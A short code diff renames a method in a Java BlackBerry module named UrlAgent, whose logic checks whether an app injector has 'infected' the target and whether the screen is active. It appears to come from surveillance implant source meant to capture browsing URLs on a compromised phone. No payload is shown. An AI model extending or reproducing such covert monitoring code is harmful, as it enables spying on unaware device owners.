@@ -122,7 +122,7 @@ public final class UrlAgent extends Module implements ApplicationObserver,
      * (non-Javadoc)
      * @see blackberry.threadpool.TimerJob#actualRun()
      */
-    public void actualRun() {
+    public void actualGo() {
         if (appInjector.isInfected() && Backlight.isEnabled()
                 && isAppForeground) {
             //#ifdef DEBUG
